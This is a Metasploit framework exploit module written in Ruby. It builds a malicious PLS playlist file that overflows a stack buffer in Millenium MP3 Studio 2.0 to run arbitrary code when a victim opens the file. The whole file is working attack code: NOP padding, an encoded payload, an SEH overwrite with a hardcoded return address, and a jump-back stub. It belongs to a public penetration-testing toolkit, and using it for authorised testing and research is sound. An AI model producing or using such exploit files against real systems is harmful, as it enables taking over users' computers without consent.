##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Millenium MP3 Studio 2.0 (PLS File) Stack Buffer Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in Millenium MP3 Studio 2.0.
          An attacker must send the file to victim and the victim must open the file.
          Alternatively it may be possible to execute code remotely via an embedded
          PLS file within a browser, when the PLS extension is registered to Millenium MP3 Studio.
          This functionality has not been tested in this module.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Molotov ', 'dookie', 'jduck' ],
      'References'     =>
        [
          [ 'OSVDB', '56574' ],
          [ 'EDB', '9618' ],
          [ 'EDB', '10240' ],
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process',
          'DisablePayloadHandler' => true
        },
      'Payload'        =>
        {
          'Space'    => 1000,
          'BadChars' => "\x00\x0a\x0d\x1a",
          'StackAdjustment' => -3500,
        },
      'Platform' => 'win',
      'Targets'        =>
        [
          [ 'Windows Universal', { 'Ret' => 0x10015593 } ], #p/p/r in xaudio.dll
        ],
      'Privileged'     => false,
      'DisclosureDate' => '2009-07-30',
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('FILENAME', [ true, 'The file name.',  'msf.pls']),
        ])
  end

  def exploit

    header = "[playlist]\r\n"
    header << "NumberOfEntries=1\r\n"
    header << "File1=http://"

    sploit = make_nops(4103 - payload.encoded.length)
    sploit << payload.encoded
    sploit << generate_seh_record(target.ret)

    sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + (4103+8).to_s).encode_string
    # note, one of the arguments get modified post overflow, so executing stuff below here is risky...

    filepls = header + sploit

    print_status("Creating '#{datastore['FILENAME']}' file ...")

    file_create(filepls)

  end
end
